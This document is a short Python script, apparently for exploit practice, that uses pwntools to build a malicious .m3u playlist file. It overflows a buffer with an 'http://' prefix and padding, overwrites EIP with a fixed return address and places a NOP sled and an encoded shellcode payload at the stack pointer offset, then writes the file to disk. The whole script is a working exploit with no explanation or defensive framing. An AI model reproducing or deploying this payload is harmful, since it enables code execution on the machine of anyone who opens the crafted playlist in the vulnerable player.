from pwn import *

cmd = "http://"
offset_to_eip = 17424
offset_to_esp = 17432
new_eip = 0x100371F5

#badchars = \x00\x0a\x0d\x20

shellcode =  b"\x90"*20
shellcode += b"\xda\xd9\xd9\x74\x24\xf4\x5f\xb8\x2e\x97\x70"
shellcode += b"\x15\x31\xc9\xb1\x52\x83\xef\xfc\x31\x47\x13"
shellcode += b"\x03\x69\x84\x92\xe0\x89\x42\xd0\x0b\x71\x93"
shellcode += b"\xb5\x82\x94\xa2\xf5\xf1\xdd\x95\xc5\x72\xb3"
shellcode += b"\x19\xad\xd7\x27\xa9\xc3\xff\x48\x1a\x69\x26"
shellcode += b"\x67\x9b\xc2\x1a\xe6\x1f\x19\x4f\xc8\x1e\xd2"
shellcode += b"\x82\x09\x66\x0f\x6e\x5b\x3f\x5b\xdd\x4b\x34"
shellcode += b"\x11\xde\xe0\x06\xb7\x66\x15\xde\xb6\x47\x88"
shellcode += b"\x54\xe1\x47\x2b\xb8\x99\xc1\x33\xdd\xa4\x98"
shellcode += b"\xc8\x15\x52\x1b\x18\x64\x9b\xb0\x65\x48\x6e"
shellcode += b"\xc8\xa2\x6f\x91\xbf\xda\x93\x2c\xb8\x19\xe9"
shellcode += b"\xea\x4d\xb9\x49\x78\xf5\x65\x6b\xad\x60\xee"
shellcode += b"\x67\x1a\xe6\xa8\x6b\x9d\x2b\xc3\x90\x16\xca"
shellcode += b"\x03\x11\x6c\xe9\x87\x79\x36\x90\x9e\x27\x99"
shellcode += b"\xad\xc0\x87\x46\x08\x8b\x2a\x92\x21\xd6\x22"
shellcode += b"\x57\x08\xe8\xb2\xff\x1b\x9b\x80\xa0\xb7\x33"
shellcode += b"\xa9\x29\x1e\xc4\xce\x03\xe6\x5a\x31\xac\x17"
shellcode += b"\x73\xf6\xf8\x47\xeb\xdf\x80\x03\xeb\xe0\x54"
shellcode += b"\x83\xbb\x4e\x07\x64\x6b\x2f\xf7\x0c\x61\xa0"
shellcode += b"\x28\x2c\x8a\x6a\x41\xc7\x71\xfd\xae\xb0\x76"
shellcode += b"\xa8\x46\xc3\x88\x43\xcb\x4a\x6e\x09\xe3\x1a"
shellcode += b"\x39\xa6\x9a\x06\xb1\x57\x62\x9d\xbc\x58\xe8"
shellcode += b"\x12\x41\x16\x19\x5e\x51\xcf\xe9\x15\x0b\x46"
shellcode += b"\xf5\x83\x23\x04\x64\x48\xb3\x43\x95\xc7\xe4"
shellcode += b"\x04\x6b\x1e\x60\xb9\xd2\x88\x96\x40\x82\xf3"
shellcode += b"\x12\x9f\x77\xfd\x9b\x52\xc3\xd9\x8b\xaa\xcc"
shellcode += b"\x65\xff\x62\x9b\x33\xa9\xc4\x75\xf2\x03\x9f"
shellcode += b"\x2a\x5c\xc3\x66\x01\x5f\x95\x66\x4c\x29\x79"
shellcode += b"\xd6\x39\x6c\x86\xd7\xad\x78\xff\x05\x4e\x86"
shellcode += b"\x2a\x8e\x6e\x65\xfe\xfb\x06\x30\x6b\x46\x4b"
shellcode += b"\xc3\x46\x85\x72\x40\x62\x76\x81\x58\x07\x73"
shellcode += b"\xcd\xde\xf4\x09\x5e\x8b\xfa\xbe\x5f\x9e"

payload = fit({
	0:cmd,
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	},length=20000)

file = open('exploit.m3u','wb')
file.write(payload)
file.close()